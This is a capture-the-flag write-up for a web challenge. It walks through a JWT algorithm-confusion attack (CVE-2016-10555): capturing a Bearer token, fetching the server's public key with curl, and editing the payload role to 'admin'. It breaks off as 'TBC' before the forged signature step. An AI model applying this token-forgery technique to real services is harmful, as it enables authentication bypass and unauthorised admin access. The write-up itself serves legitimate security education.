# Challenge: Unlock Me (Web-1)
Our agents discovered COViD's admin panel! They also stole the credentials minion:banana, but it seems that the user isn't allowed in. Can you find another way?

Website: http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/

## Summary:
The web application was vulnerable to CVE-2016-10555 where the algorithm type is not properly being checked. More can be found here: https://nvd.nist.gov/vuln/detail/CVE-2016-10555.

Relevant CWE:

CWE-287: Improper Authentication (https://cwe.mitre.org/data/definitions/287.html)

## Tools used:
OS - Kali Linux

BurpSuite - to inspect and modify web requests

JSON Web Attacker BurpSuite plugin - helps to automate the attack (https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61)

## Process:
According to Wikipedia, a JSON Web Token is an Internet standard for creating data with optional signature and/or optional encryption whose payload holds JSON data such as roles and usernames. The tokens are signed either using a private secret or a public/private key, in other words, it is similar to a cookie which carries information about the user.
JSON Web tokens can be easily spotted using the following methods:

1) If the string starts with "eyJhbGci...", it is most likely a JWT token
2) If the string consists of two dots (.), it is most likely a JWT token

On the website I logged into the website using the provided credentials minion:banana. I proxied it forward through Burp Suite. I then get this following request I made 
```````
GET /unlock HTTP/1.1
Host: yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NTI5MTMxfQ.XZD1sFxPkkV9hHtttEwZm9GuY7zcIBeL3bNRq_QEzjXawGtrxUWKfiA4X_KA2Kyb7RCq4b6fjFBGsDCfY28g-WRw0-tRPOU3e1qmn_Uo8HRPS-2ZAR2ObJEGbU-bKiCVLZc9QyZb9UEIb_MBRDjk_w3lR4d1UYi_THx6obMFbqbijV9vRdZqp6NuzwnrE5_Br2XGXuD17w7s1WAQ6Y72yP4IVdKdUz7s-gJgnk8Y5Bed5tcEWwHtKGlLa_oyR6iskCWijHU1tp-p-xyNTbOzSjd_bNF3l59MF0ChwRqDP_wiGfhEEO5xWnVpsw3JMIghVJ6D77UkA19F-yI-KY8qGgKDI71dFgLjI0ITx6qpTB3N-65ow8NYzDpc3ytSQllcAVw_mFBPlaC0vm92al5YqXdDzdyALgFSvS-EpX0pf-QXgt7DhCsZU_aCXfmArC75oVtWwTRTBg_cT5GdPKoEAfOjsB9x7uR1tsKxsV06INoA83_yo9Wi9gGPYjHiMg7XDgSE_3KGq8CJMgIeFpoCSkvJy7C8tbWyA9KDWz9cBENy9ERF2DNggNjwpmx10yKP1IW4VR5nr6NTIMuUnuanfzOKmAVvTx44X-4pzDXnyYbXbu-5XASpPpNfdJh9qfmfysNX1axyzoKSp08kycz8hCnbgZ4t2CCKnLIXzzEgY9E
Connection: close
Cookie: __cfduid=d7dea684ee9d33772602f489a7f40dfca1607085880
If-None-Match: W/"2c-HIo8OazkINs/Y63UTfaXAuuMrWk"
```````
Aha! A JWT token can be found under the Authorization: Bearer component. Go ahead and copy the JWT token into https://jwt.io/ as shown.

![JWT.IO](https://github.com/BunchOfBytes/STF-2020/blob/main/Screenshot%20(8).png)

As seen, there are 3 parts of the token, a header which specifies what JWT token to use, a payload which carries the data about the user to be transmitted and the signature which verifies that the JWT is legit.  Notice that the payload in the above screenshot consists of the object "role":"user", we can try changing this to "role":"admin"
and see if we bypass this admin check.

Moreover, there is CVE-2016-10555 which allows us to change the algorithm type from RS256 to HS256 without the server verifying it and generate a valid signature for it using the public key of the private key used to sign the RS256 token. More information can be found here: https://nvd.nist.gov/vuln/detail/CVE-2016-10555. On the same jwt.io modify 

We can automate this attack using JSON Web Token Attacker, JSON Web Token Attacker contains a suite of tools which can be used to automatically attack a website using JWT Web Token, this is especially helpful for bug bounties where doing the manual method can sometimes be very tedious.

In the HTML of the website we see the comment: 
```````
// TODO: Add client-side verification using public.pem
```````
which verifies that we have to perform CVE-2016-10555. We can obtain the value of the public key
```````
curl http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem
```````
That gives us the public key
```````
-----BEGIN PUBLIC KEY-----
MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA4Cot1mM0eF5cZUnifKx0
8MJQ59ui9/8DLzWpWWtlPGsB4T9UsaAspndZJafbGFq0v+vGzG+TltJjb1v+tTj8
sqFanc/KWdQZr3WwmuhU95EJ7RRhtEIxTN8Rn1KOKUqZ/Plmf4LrMrMZm66DqaTW
H2my5IRShK0i0YpziT9JEeVJtS/zC+UUdbImrOavjD4PDZv14FLEuePMN0mCNcQ5
z5iSQv5j8npbtvMBbeAKMvYyCeIchjW22Dp/tNi4xfI7CaTyPp0pO3+MZ9vJ8O02
YOC7/+tQX2NdveVuKYEg4XTQ/nmiYSK9DeXyO/EGkQzxZjpLv5ZMN07Nau2xpQoG
1Ip4YfDA5Y/MjA8qDgNN0n/pmBaPBHNvFK6mWJllnuOnLpQHCxZNxBudxTLSoXkq
XQPRKcdZpbv0kjt/ZpwkoXHfQLToJyZQgQXtEHaW36Ko9Xjq3cDWzkSjADMxaq/5
8SZvPUknm3Mv9KN8zYiePYGUl2aLyKumKF++rlh7a6xJgcBcs10bf0yyeRU3NWWb
0pz4dgdrgh2sXrg/U51VhejnNfvfRf+4Cy1QM4QWbKXZk9sLtLpkfiou/ri3YUn3
txIgfYKa7a5tOtBWSRHHlHOmS58Ab51pmSGdjIeCa+WMie0i5reuRb6WJ27jnvJF
G0hytABBbCgeL00ymJK16tUCAwEAAQ==
-----END PUBLIC KEY-----
```````
Now that we have the public key string we can start to perform the attack. Firstly we copy the 2nd portion of the JWT token which is the payload and base64 decode it.
```````
Encoded: eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NTI5MTMxfQ
Decoded: {"username":"minion","role":"user","iat":1607529131}
```````

And change the role to admin and base64 encode it 
```````
Decoded: {"username":"minion","role":"admin","iat":1607529131}
Encoded: eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzUyOTEzMX0=
```````
Now we replace the 2nd portion with the encoded value to obtain our modified JWT token removing the = sign 
```````
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzUyOTEzMX0.XZD1sFxPkkV9hHtttEwZm9GuY7zcIBeL3bNRq_QEzjXawGtrxUWKfiA4X_KA2Kyb7RCq4b6fjFBGsDCfY28g-WRw0-tRPOU3e1qmn_Uo8HRPS-2ZAR2ObJEGbU-bKiCVLZc9QyZb9UEIb_MBRDjk_w3lR4d1UYi_THx6obMFbqbijV9vRdZqp6NuzwnrE5_Br2XGXuD17w7s1WAQ6Y72yP4IVdKdUz7s-gJgnk8Y5Bed5tcEWwHtKGlLa_oyR6iskCWijHU1tp-p-xyNTbOzSjd_bNF3l59MF0ChwRqDP_wiGfhEEO5xWnVpsw3JMIghVJ6D77UkA19F-yI-KY8qGgKDI71dFgLjI0ITx6qpTB3N-65ow8NYzDpc3ytSQllcAVw_mFBPlaC0vm92al5YqXdDzdyALgFSvS-EpX0pf-QXgt7DhCsZU_aCXfmArC75oVtWwTRTBg_cT5GdPKoEAfOjsB9x7uR1tsKxsV06INoA83_yo9Wi9gGPYjHiMg7XDgSE_3KGq8CJMgIeFpoCSkvJy7C8tbWyA9KDWz9cBENy9ERF2DNggNjwpmx10yKP1IW4VR5nr6NTIMuUnuanfzOKmAVvTx44X-4pzDXnyYbXbu-5XASpPpNfdJh9qfmfysNX1axyzoKSp08kycz8hCnbgZ4t2CCKnLIXzzEgY9E
```````

To modify the JWT token, forward to request from earlier to Repeater and then to JOSEPH once you have downloaded the plugin (https://portswigger.net/bappstore/82d6c60490b540369d6d5d01822bdf61) from the BAppStore.

Writeup TBC

